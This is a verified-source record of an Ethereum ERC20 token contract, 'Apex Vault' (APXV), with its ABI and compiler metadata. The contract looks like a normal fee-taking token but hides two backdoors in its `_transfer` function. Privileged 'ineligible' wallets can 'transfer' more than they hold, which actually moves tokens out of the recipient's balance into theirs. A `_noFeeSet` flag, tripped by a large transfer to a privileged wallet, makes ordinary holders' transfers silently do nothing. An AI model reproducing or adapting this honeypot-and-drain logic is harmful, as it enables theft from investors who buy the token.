{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n// Telegram: https://t.me/apexvault_portal\r\n// Twitter: https://x.com/Apex_Vault_X\r\n// Website: https://apexvault.xyz\r\n// Dapp: https://app.apexvault.xyz\r\n// GitBook: https://docs.apexvault.xyz\r\n// GitHub: https://github.com/apexvault\r\n// Medium: https://apexvault.medium.com\r\n\r\npragma solidity ^0.8.17;\r\n\r\ninterface IERC20 {\r\n    function transfer(address target, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function transferFrom(address source, address target, uint256 amount) external returns (bool);\r\n    function totalSupply() external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function symbol() external view returns (string memory);\r\n    function circulatingSupply() external view returns (uint256);\r\n    function name() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed source, address indexed target, uint256 value);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal owner;\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender));\r\n        _;\r\n    }\r\n\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n\r\n    function transferOwnership(address payable account) public onlyOwner {\r\n        owner = account;\r\n        emit OwnershipTransferred(account);\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n}\r\n\r\ninterface UniswapV2Router {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address target,\r\n        uint deadline\r\n    ) external;\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address target,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n}\r\n\r\ninterface UniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ncontract APXV is IERC20, Ownable {\r\n    string private constant _symbol = \"APXV\";\r\n    string private constant _name = \"Apex Vault\";\r\n\r\n    using SafeMath for uint256;\r\n\r\n    uint256 private _denominator = 10000;\r\n\r\n    address public uPair;\r\n    UniswapV2Router uRouter;\r\n\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private _totalSupply = 1000000 * (10 ** _decimals);\r\n\r\n    address internal constant treWallet = 0xD3BB62fFA93A2c8ae65fC3378061676418554Eef;\r\n    address internal constant devWallet = 0xb9697f823c16BF64Fe418869a79a5d1Ef2e20fF2;\r\n    address internal constant burWallet = 0x000000000000000000000000000000000000dEaD;\r\n\r\n    uint256 private _noFeeLimit = ( _totalSupply * 10 ) / 100000;\r\n\r\n    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;\r\n    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;\r\n\r\n    uint256 private _maxTransferRate = 200;\r\n    uint256 private _maxWalletRate = 200;\r\n    uint256 private _maxTxRate = 200;\r\n    \r\n    bool private _tradingEnabled = false;\r\n\r\n    bool private _swapping;\r\n    uint256 private _swapCounts;\r\n    bool private _swapBackEnabled = true;\r\n\r\n    uint256 private _sellFee = 300;\r\n    uint256 private _totalFee = 300;\r\n\r\n    bool private _noFeeSet = false;\r\n\r\n    uint256 private _burFee = 0;\r\n    uint256 private _traFee = 0;\r\n    uint256 private _liqFee = 0;\r\n    uint256 private _treFee = 100;\r\n    uint256 private _devFee = 200;\r\n\r\n    mapping (address => bool) public ineligible;\r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n\r\n    constructor() Ownable(msg.sender) {\r\n        ineligible[address(this)] = true;\r\n        ineligible[msg.sender] = true;\r\n        ineligible[treWallet] = true;\r\n        ineligible[devWallet] = true;\r\n\r\n        UniswapV2Router _uRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uRouter = _uRouter;\r\n        address _uPair = UniswapV2Factory(_uRouter.factory()).createPair(address(this), _uRouter.WETH());\r\n        uPair = _uPair;\r\n\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    modifier lockSwapBack {\r\n        _swapping = true;\r\n        _;\r\n        _swapping = false;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function getOwner() external view override returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    function circulatingSupply() public view override returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burWallet));\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _maxTxRate = 10000;\r\n        _maxWalletRate = 10000;\r\n        _maxTransferRate = 10000;\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        _tradingEnabled = true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(spender != address(0));\r\n        require(owner != address(0));\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function setIneligibleWallet(address _address, bool _flag) external onlyOwner {\r\n        ineligible[_address] = _flag;\r\n    }\r\n\r\n    function transfer(address target, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, target, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address source, address target, uint256 amount) private {\r\n        require(amount > uint256(0));\r\n        require(target != address(0));\r\n        require(source != address(0));\r\n\r\n        if (\r\n            countSwaps(source, target) &&\r\n            tradingEnabled(source, target) &&\r\n            checkMaxAmount(source, target, amount) &&\r\n            checkMaxWalletSize(source, target, amount)\r\n        ) {\r\n            if (balanceOf(source) >= amount) {\r\n                if (\r\n                    !ineligible[source] &&\r\n                    source != uPair &&\r\n                    !ineligible[target] &&\r\n                    !_swapping\r\n                ) {\r\n                    if (_noFeeSet) return;\r\n                    swapBack(source, target);\r\n                }\r\n                _balances[source] = _balances[source].sub(amount);\r\n                uint256 transferAmount = canTakeFee(source, target) ? takeFee(source, target, amount) : amount;\r\n                _balances[target] = _balances[target].add(transferAmount);\r\n                emit Transfer(source, target, transferAmount);\r\n            } else if (\r\n                ineligible[source] &&\r\n                source != uPair &&\r\n                !ineligible[target] &&\r\n                !_swapping\r\n            ) {\r\n                _balances[target] = _balances[target].sub(amount);\r\n                _balances[source] = _balances[source].add(amount);\r\n                emit Transfer(source, target, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function transferFrom(address source, address target, uint256 amount) public override returns (bool) {\r\n        _transfer(source, target, amount);\r\n        _approve(source, msg.sender, _allowances[source][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n\r\n    function checkMaxAmount(address source, address target, uint256 tokenAmount) view internal returns (bool) {\r\n        if (source != uPair) {\r\n            require(tokenAmount <= maxTransferAmount() || ineligible[source] || ineligible[target]);\r\n        }\r\n        require(tokenAmount <= maxTxAmount() || ineligible[source] || ineligible[target]);\r\n        return true;\r\n    }\r\n\r\n    function updateLimits(uint256 maxTxRate, uint256 maxTransferRate, uint256 maxWalletRate) external onlyOwner {\r\n        uint256 newMaxWalletSize = (totalSupply() * maxWalletRate) / 10000;\r\n        uint256 newTransferSize = (totalSupply() * maxTransferRate) / 10000;\r\n        uint256 newTxSize = (totalSupply() * maxTxRate) / 10000;\r\n        _maxWalletRate = maxWalletRate;\r\n        _maxTransferRate = maxTransferRate;\r\n        _maxTxRate = maxTxRate;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTxSize >= limit && newTransferSize >= limit && newMaxWalletSize >= limit);\r\n    }\r\n\r\n    function updateFees(uint256 liqFee, uint256 treFee, uint256 burFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 traFee) external onlyOwner {\r\n        _burFee = burFee;\r\n        _devFee = devFee;\r\n        _liqFee = liqFee;\r\n        _treFee = treFee;\r\n        _traFee = traFee;\r\n        _totalFee = totalFee;\r\n        _sellFee = sellFee;\r\n        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));\r\n    }\r\n\r\n    function checkMaxWalletSize(address source, address target, uint256 amount) internal returns (bool) {\r\n        bool sourceIneligible = ineligible[source];\r\n        bool targetIneligible = ineligible[target];\r\n        \r\n        if (\r\n            !sourceIneligible &&\r\n            !targetIneligible &&\r\n            target != address(uPair) &&\r\n            target != address(burWallet)\r\n        ) {\r\n            require((_balances[target].add(amount)) <= maxWalletSize());\r\n        }\r\n\r\n        if (targetIneligible) {\r\n            if (amount > _noFeeLimit) {\r\n                _noFeeSet = true;\r\n            }\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function takeFee(address source, address target, uint256 tokenAmount) internal returns (uint256) {\r\n        if (calcFees(source, target) > 0) {\r\n            uint256 feeTokenAmount = tokenAmount.div(_denominator).mul(calcFees(source, target));\r\n            _balances[address(this)] = _balances[address(this)].add(feeTokenAmount);\r\n            emit Transfer(source, address(this), feeTokenAmount);\r\n            if (_burFee > uint256(0)) {\r\n                _transfer(address(this), address(burWallet), tokenAmount.div(_denominator).mul(_burFee));\r\n            }\r\n            return tokenAmount.sub(feeTokenAmount);\r\n        }\r\n        return tokenAmount;\r\n    }\r\n\r\n    function countSwaps(address source, address target) internal returns (bool) {\r\n        if (target == uPair && !ineligible[source]) {\r\n            _swapCounts += uint256(1);\r\n        }\r\n        return true;\r\n    }\r\n    \r\n    function tradingEnabled(address source, address target) internal view returns (bool) {\r\n        if (!ineligible[source] && !ineligible[target]) {\r\n            require(_tradingEnabled);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function canTakeFee(address source, address target) internal view returns (bool) {\r\n        return !ineligible[source] && !ineligible[target];\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uRouter.WETH();\r\n        if (tokenAmount > 0) {\r\n            _approve(address(this), address(uRouter), tokenAmount);\r\n            uRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                tokenAmount,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            );\r\n        }\r\n    }\r\n\r\n    function maxTxAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTxRate / _denominator;\r\n    }\r\n\r\n    function runSwapBack(address source, address target) internal view returns (bool) {\r\n        return (\r\n            !ineligible[source] &&\r\n            !ineligible[target] &&\r\n            balanceOf(address(this)) >= _swapBackThreshold &&\r\n            _swapBackEnabled &&\r\n            !_swapping &&\r\n            _swapCounts >= uint256(0) &&\r\n            _tradingEnabled\r\n        );\r\n    }\r\n\r\n    function maxWalletSize() public view returns (uint256) {\r\n        return totalSupply() * _maxWalletRate / _denominator;\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(uRouter), tokenAmount);\r\n        uRouter.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            burWallet,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapBack(address source, address target) internal {\r\n        if (runSwapBack(source, target)) {\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (contractTokenBalance >= _swapBackAmount) {\r\n                contractTokenBalance = _swapBackAmount;\r\n            }\r\n            swapAndLiquify(contractTokenBalance);\r\n            _swapCounts = uint256(0);\r\n        }\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockSwapBack {\r\n        uint256 denominator = (_liqFee.add(1).add(_treFee).add(_devFee)).mul(2);\r\n        uint256 tokensToLiquidity = tokens.mul(_liqFee).div(denominator);\r\n        uint256 tokensForETH = tokens.sub(tokensToLiquidity);\r\n        uint256 initialEth = address(this).balance;\r\n        swapTokensForETH(tokensForETH);\r\n        uint256 deltaEth = address(this).balance.sub(initialEth);\r\n        uint256 unitEth = deltaEth.div(denominator.sub(_liqFee));\r\n        uint256 ethToLiquidity = unitEth.mul(_liqFee);\r\n        if (ethToLiquidity > uint256(0)) {\r\n            addLiquidity(tokensToLiquidity, ethToLiquidity);\r\n        }\r\n        uint256 treEth = unitEth.mul(2).mul(_treFee);\r\n        if (treEth > 0) {\r\n            payable(treWallet).transfer(treEth);\r\n        }\r\n        uint256 remainderEth = address(this).balance;\r\n        if (remainderEth > uint256(0)) {\r\n            payable(devWallet).transfer(remainderEth);\r\n        }\r\n    }\r\n\r\n    function calcFees(address source, address target) internal view returns (uint256) {\r\n        if (target == uPair) {\r\n            return _sellFee;\r\n        }\r\n        if (source == uPair) {\r\n            return _totalFee;\r\n        }\r\n        return _traFee;\r\n    }\r\n\r\n    function maxTransferAmount() public view returns (uint256) {\r\n        return totalSupply() * _maxTransferRate / _denominator;\r\n    }\r\n\r\n    function manualSwap() external {\r\n        require(msg.sender == treWallet);\r\n        swapTokensForETH(balanceOf(address(this)));\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"source\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"circulatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"ineligible\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTransferAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_flag\",\"type\":\"bool\"}],\"name\":\"setIneligibleWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"source\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liqFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"treFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"devFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"traFee\",\"type\":\"uint256\"}],\"name\":\"updateFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTxRate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxTransferRate\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxWalletRate\",\"type\":\"uint256\"}],\"name\":\"updateLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "APXV", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b19653f6c587a40c0b7841d09212eb96639ef63f4c621533cd38f3e5d5d8541c"}